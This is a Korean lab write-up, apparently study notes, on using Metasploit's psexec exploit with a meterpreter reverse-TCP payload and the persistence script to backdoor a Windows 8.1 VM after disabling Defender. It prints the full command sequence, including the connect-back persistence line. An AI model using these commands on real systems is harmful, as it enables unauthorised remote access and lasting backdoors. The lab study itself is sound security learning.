# 실습과정

### Persistence
우리는 Window 8.1에서도 동일한 BackDoor를 만들기 위해 다음과 같이 진행을 할것이다.

그중 우리는 **psexec**를 통해 expoit을 할 것이다.

그래서 다음과 같은 작업을 순서대로 진행을 합니다.  
**msfconsole**  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/BackDoor/Window%208.1/Persistence/msfconsole.png)  

그다음 우리는 psexec를 통해 expoit을 한다고 하였으므로 이를 검색하고 공격방법으로 설정을 한다.
**search psexec**  
**use exploit/windows/smb/psexec**  
**set payload windows/meterpreter/reverse_tcp_allports**  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/BackDoor/Window%208.1/Persistence/%EA%B3%B5%EA%B2%A9%EB%B0%A9%EB%B2%95%EA%B3%BC%20payload%EC%84%A4%EC%A0%95.png)  

이렇게 공격방법을 선택했다면 다음으로는 내부의 옵션들을 설정한다.
**show options**  
**set RHOST (Window 8.1의 IP)**  
**set LHOST (Kali의 IP)**  
**set smbuser administrator**  
**set smbpass (password == 필자는 arad4228 )**  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/BackDoor/Window%208.1/Persistence/%EB%82%98%EB%A8%B8%EC%A7%80%20option%EC%84%A4%EC%A0%95.png)
이렇게 옵션들을 설정한 다음 다음과 같이 공격을 했을 경우 아래의 사진처럼 나오게 될것이다.
**run**  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/BackDoor/Window%208.1/Persistence/Window%208.1%20Defender%EC%97%90%20%EC%9D%98%ED%95%B4%20%EA%B1%B0%EB%B6%80.png)
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/BackDoor/Window%208.1/Persistence/Window%208.1%20Defender.png)

공격에 들어가게 된다면 window defender에 의해 공격이 가로막히게 되며 더이상의 진행이 불가능하게 된다.

따라서 임의로 일단 window defender를 끄고 다시한번 run을 하면 진행이 되는 모습이 보인다.  
**run**  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/BackDoor/Window%208.1/Persistence/Window%208.1%20Defender%20%ED%95%B4%EC%A0%9C.png)  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/BackDoor/Window%208.1/Persistence/Window%208.1%20Defender%20%ED%95%B4%EC%A0%9C%ED%9B%84%20%EA%B3%B5%EA%B2%A9%20%EC%84%B1%EA%B3%B5.png)

그후 Persistence를 얻는 나머지 과정을 진행을 하면 다음과 같이 진행된다.

**sysinfo**  
**run persistence -h**  
**run persistence -A -X -i 10 -p 6666 -r (Kali의 Ip)**  
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/BackDoor/Window%208.1/Persistence/persistence%EB%A5%BC%20%EC%96%BB%EA%B8%B0.png)

이렇게 공격이 진행된 이후 생성된 script가 있는 공간을 가보면 다음과 같은 결과가 나타난다.
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/BackDoor/Window%208.1/Persistence/%EA%B3%B5%EA%B2%A9%20%EC%84%B1%EA%B3%B5.png)  
그리고 마찬가지로 regestry를 확인해보면 다음과 같다.
![img](https://github.com/arad4228/2021_winter/blob/main/Kali_linux/Post%20Exploitation/BackDoor/Window%208.1/Persistence/register%20%EB%AF%B8%EC%9E%91%EB%8F%99.png)
위의 사진을 보면 regesty는 동작하지 않은 것으로 보인다.
이유는 아마도 window Defender에서 시스템에 대한 수정을 거부하여 나타난 것을 보인다.

이후 공격은 windowXp와 같은 방식으로 BackDoor를 진행하면된다.
그러나 이는 강제로 Window Defender를 제거하고 진행을 하였기에 더이상의 진행은 의미가 없다고 생각하고 이는 여지로 남겨둘 것이다.
추후 공부를 통해 Window Defender가 제대로 동작하는 상태에서 이를 파회하는 방법을 찾아 진행을 해볼 것입니다.

## 따라서 오늘의 배운점.
아무리 Window 기본에 탑재된 Defender 즉 기본 백신도 있어야 기본적인 공격에 대해 취약해지지 않는 다는 것을 몸소 느낄 수 있었던 실습이었습니다.
